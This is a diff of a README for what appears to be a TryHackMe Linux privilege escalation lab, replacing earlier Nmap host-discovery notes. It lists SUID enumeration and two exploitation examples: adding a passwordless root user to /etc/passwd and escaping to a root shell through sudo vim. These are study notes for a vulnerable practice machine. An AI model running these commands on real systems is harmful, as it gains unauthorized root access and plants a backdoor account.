@@ -1,35 +1,54 @@
-# Nmap Live Host Discovery
+# Linux Privilege Escalation - TryHackMe
 
 ## Overview
 
-This project demonstrates how to discover live hosts using Nmap.
+This project demonstrates multiple privilege escalation techniques on a vulnerable Debian machine.
 
 ## Tools Used
 
-* Nmap
 * Kali Linux
-* TryHackMe Lab
+* SSH
+* Linux commands
 
 ## Techniques Covered
 
-* ARP Scan
-* ICMP Scan
-* TCP SYN & ACK Ping
-* UDP Ping
+* Weak File Permissions
+* SUID Exploitation
+* Sudo Misconfiguration
+* Cron Jobs Exploitation
+* Environment Variable Abuse
+* Password & Key Discovery
 
-## Key Commands
+## Enumeration Commands
 
 ```
-sudo nmap -PR -sn <target>/24
-sudo nmap -PE -sn <target>/24
-sudo nmap -PS22,80,443 -sn <target>/30
+whoami
+id
+uname -a
+sudo -l
+find / -perm -4000 2>/dev/null
+```
+
+## Exploitation Examples
+
+### Writable /etc/passwd
+
+```
+echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
+```
+
+### Sudo Exploit
+
+```
+sudo vim
+:!bash
 ```
 
 ## Learning Outcome
 
-* Understood host discovery techniques
-* Learned CIDR basics
-* Practiced real-world scanning
+* Learned privilege escalation techniques
+* Understood Linux misconfigurations
+* Practiced real-world attack scenarios
 
 ## Screenshots
 
